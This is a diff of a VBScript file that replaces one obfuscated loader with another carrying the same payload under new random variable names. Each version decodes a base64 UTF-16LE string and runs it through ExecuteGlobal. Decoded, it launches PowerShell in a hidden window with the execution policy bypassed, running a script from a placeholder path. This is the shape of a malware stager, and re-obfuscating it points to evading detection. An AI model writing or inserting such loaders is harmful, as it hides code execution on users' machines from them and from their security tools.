@@ -1,19 +1,20 @@
-Dim ocrompvk
-ocrompvk = ""
-ocrompvk = ocrompvk & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAEMAb"
-ocrompvk = ocrompvk & "QBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVw"
-ocrompvk = ocrompvk & "BTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByAHMAaAB"
-ocrompvk = ocrompvk & "lAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0"
-ocrompvk = ocrompvk & "AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1A"
-ocrompvk = ocrompvk & "HQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAE"
-ocrompvk = ocrompvk & "QAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAbAAuAFIAdQBuACA"
-ocrompvk = ocrompvk & "AcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAGwAIAA9ACAATgBvAHQA"
-ocrompvk = ocrompvk & "aABpAG4AZwA="
-Dim eeptbfqc : Set eeptbfqc = CreateObject("ADODB.Stream")
-eeptbfqc.Type = 1 : eeptbfqc.Open
-Dim xberdgwi : Set xberdgwi = CreateObject("MSXml2.DOMDocument").createElement("z")
-xberdgwi.dataType = "bin.base64" : xberdgwi.text = ocrompvk
-eeptbfqc.Write xberdgwi.nodeTypedValue
-eeptbfqc.Position = 0 : eeptbfqc.Type = 2 : eeptbfqc.Charset = "UTF-16LE"
-Dim vxomsavh : vxomsavh = eeptbfqc.ReadText : eeptbfqc.Close
-ExecuteGlobal vxomsavh
+Dim xolpbrsj
+xolpbrsj = ""
+xolpbrsj = xolpbrsj & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsAC"
+xolpbrsj = xolpbrsj & "wAIABzAEMAbQBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBP"
+xolpbrsj = xolpbrsj & "AGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQ"
+xolpbrsj = xolpbrsj & "BkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8A"
+xolpbrsj = xolpbrsj & "ZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG"
+xolpbrsj = xolpbrsj & "8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABv"
+xolpbrsj = xolpbrsj & "AGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIgAlACUAVQBQAEQAQQ"
+xolpbrsj = xolpbrsj & "BUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAbAAuAFIA"
+xolpbrsj = xolpbrsj & "dQBuACAAcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAG"
+xolpbrsj = xolpbrsj & "wAIAA9ACAATgBvAHQAaABpAG4AZwA="
+Dim dxwhncpn : Set dxwhncpn = CreateObject("ADODB.Stream")
+dxwhncpn.Type = 1 : dxwhncpn.Open
+Dim tfjwexzw : Set tfjwexzw = CreateObject("MSXml2.DOMDocument").createElement("z")
+tfjwexzw.dataType = "bin.base64" : tfjwexzw.text = xolpbrsj
+dxwhncpn.Write tfjwexzw.nodeTypedValue
+dxwhncpn.Position = 0 : dxwhncpn.Type = 2 : dxwhncpn.Charset = "UTF-16LE"
+Dim yxwxutjg : yxwxutjg = dxwhncpn.ReadText : dxwhncpn.Close
+ExecuteGlobal yxwxutjg
